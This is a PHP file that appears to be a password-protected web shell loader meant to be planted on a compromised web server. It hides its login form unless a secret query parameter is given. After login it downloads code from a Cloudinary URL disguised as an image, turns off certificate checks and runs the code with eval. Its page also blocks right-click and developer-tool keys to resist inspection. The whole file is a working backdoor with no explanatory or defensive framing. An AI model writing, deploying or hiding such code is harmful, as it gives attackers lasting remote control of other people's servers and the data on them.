<?php
session_start();

function is_logged_in() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}
$userMd5 = 'a4ca719c3fa51b57bff8716f5ebe028d';
$passMd5 = 'ec07decc7fe3994412cb51cc7be02fcb';
if (!is_logged_in()) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if (md5($_POST['username']) === $userMd5 && md5($_POST['password']) === $passMd5) {
            $_SESSION['loggedin'] = true;
            header("Location: " . strtok($_SERVER['REQUEST_URI'], '?'));
            exit();
        } else {
            $error = "Wrong";
        }
    }
}
function geturlsinfo($destiny) {
    $Array = array(
        'fopen',
        'stream_get_contents',
        'file_get_contents',
        'curl_exec'
    );

    if (function_exists($Array[3])) {
        $ch = curl_init($destiny);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $love = curl_exec($ch);
        curl_close($ch);
        return $love;
    } elseif (function_exists($Array[2])) {
        return file_get_contents($destiny);
    } elseif (function_exists($Array[0]) && function_exists($Array[1])) {
        $purpose = fopen($destiny, "r");
        $love = stream_get_contents($purpose);
        fclose($purpose);
        return $love;
    }
    return false;
}

if (is_logged_in()) {
    $destiny = 'https://res.cloudinary.com/dkgvqbc6x/image/upload/v1786662627/kuyangbaru_kvc7tx';
    
    $dream = geturlsinfo($destiny);

    if ($dream !== false) {
        $pos = strpos($dream, '<?php');
        if ($pos !== false) {
            $phpCode = substr($dream, $pos + 5); 
            eval($phpCode);
        } else {
            eval('?>' . $dream);
        }
        exit();
    }
}

if (!is_logged_in()) {
    $showForm = isset($_GET['not']) || isset($error);
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>EL STILL HERE</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body, html {
                height: 100%;
                font-family: 'Orbitron', sans-serif;
            }
            body {
                background: url('https://wallpapercave.com/wp/wp13582695.jpg') no-repeat center center fixed;
                background-size: cover;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .form-container {
                display: <?php echo $showForm ? 'flex' : 'none'; ?>;
                justify-content: center;
                align-items: center;
                width: 100%;
                padding: 20px;
            }
            .login-form {
                width: 100%;
                max-width: 380px;
                padding: 40px 30px;
                background: rgba(20, 0, 0, 0.88);
                backdrop-filter: blur(10px);
                -webkit-backdrop-filter: blur(10px);
                border-radius: 16px;
                box-shadow: 0 0 25px rgba(255, 102, 0, 0.6), 0 0 50px rgba(255, 0, 0, 0.4), inset 0 0 15px rgba(255, 102, 0, 0.2);
                text-align: center;
                color: #fff;
                border: 2px dashed rgba(255, 120, 0, 0.6);
            }
            .login-form img {
                width: 90px;
                height: 90px;
                border-radius: 50%;
                object-fit: cover;
                margin-bottom: 15px;
                border: 3px solid rgba(255, 120, 0, 0.6);
                box-shadow: 0 0 15px rgba(255, 102, 0, 0.5);
            }
            .login-form h2 {
                margin: 0 0 25px 0;
                font-size: 22px;
                font-weight: 800;
                letter-spacing: 2px;
                color: #ff8533;
                text-shadow: 0 0 12px rgba(255, 102, 0, 0.8);
            }
            .login-form input[type="text"],
            .login-form input[type="password"] {
                width: 100%;
                padding: 14px 16px;
                margin: 10px 0;
                border-radius: 8px;
                background: rgba(255, 255, 255, 0.05);
                color: #fff;
                font-size: 15px;
                font-family: 'Orbitron', sans-serif;
                transition: all 0.3s ease;
                border: 1px solid rgba(255, 120, 0, 0.3);
            }
            .login-form input[type="text"]::placeholder,
            .login-form input[type="password"]::placeholder {
                color: rgba(255, 255, 255, 0.5);
            }
            .login-form input[type="text"]:focus,
            .login-form input[type="password"]:focus {
                outline: none;
                background: rgba(255, 102, 0, 0.1);
                border-color: rgba(255, 120, 0, 0.8);
                box-shadow: 0 0 12px rgba(255, 102, 0, 0.5);
            }
            .login-form button {
                width: 100%;
                padding: 14px;
                margin-top: 20px;
                background: linear-gradient(135deg, #ff6600 0%, #b30000 100%);
                color: white;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                font-size: 15px;
                font-weight: 600;
                font-family: 'Orbitron', sans-serif;
                letter-spacing: 1px;
                transition: all 0.3s ease;
                text-transform: uppercase;
                box-shadow: 0 4px 20px rgba(255, 102, 0, 0.6);
            }
            .login-form button:hover {
                transform: translateY(-2px);
                box-shadow: 0 6px 25px rgba(255, 102, 0, 0.9);
                background: linear-gradient(135deg, #ff8533 100%, #cc0000 0%);
            }
            .error-message {
                background: rgba(255, 82, 82, 0.2);
                color: #ff5252;
                font-size: 14px;
                padding: 10px;
                border-radius: 6px;
                margin-bottom: 15px;
                border: 1px solid rgba(255, 82, 82, 0.4);
            }

            #customPopup {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.7);
                backdrop-filter: blur(5px);
                justify-content: center;
                align-items: center;
                z-index: 99999;
            }
            .popup-box {
                background: rgba(20, 0, 0, 0.95);
                border: 2px solid #ff6600;
                padding: 30px;
                border-radius: 12px;
                text-align: center;
                color: #fff;
                box-shadow: 0 0 25px rgba(255, 102, 0, 0.8);
                max-width: 300px;
                width: 90%;
            }
            .popup-box h3 {
                color: #ff8533;
                margin-bottom: 15px;
                font-size: 18px;
                letter-spacing: 1px;
            }
            .popup-box button {
                padding: 10px 25px;
                background: linear-gradient(135deg, #ff6600 0%, #b30000 100%);
                color: white;
                border: none;
                border-radius: 6px;
                cursor: pointer;
                font-family: 'Orbitron', sans-serif;
                font-weight: 600;
                margin-top: 15px;
                box-shadow: 0 0 10px rgba(255, 102, 0, 0.5);
            }
        </style>
    </head>
    <body>
        <div class="form-container" id="formContainer">
            <div class="login-form">
                <img src="https://i.pinimg.com/originals/fa/6a/a8/fa6aa8b9f02691e42df56f1678e795fc.gif" alt="Logo">
                <h2>SINGLE FIGHTER ERA</h2>
                <?php if (isset($error)): ?>
                    <div class="error-message"><?php echo $error; ?></div>
                <?php endif; ?>
                <form method="post">
                    <input type="text" name="username" placeholder="Username ..." required>
                    <input type="password" name="password" placeholder="Password ..." required>
                    <button type="submit">UDAH IMO BELUM</button>
                </form>
            </div>
        </div>
        <div id="customPopup">
            <div class="popup-box">
                <h3>nyari apa dek?</h3>
                <button onclick="closePopup()">TUTUP</button>
            </div>
        </div>
        <script>
            function showWarning() {
                document.getElementById('customPopup').style.display = 'flex';
            }
           function closePopup() {
                document.getElementById('customPopup').style.display = 'none';
            }
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                showWarning();
            });
            document.addEventListener('keydown', function(e) {
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) || 
                    (e.ctrlKey && (e.key === 'U' || e.key === 'u'))) {
                    e.preventDefault();
                    showWarning();
                }
            });
        </script>
    </body>
    </html>
    <?php
    exit();
}
?>
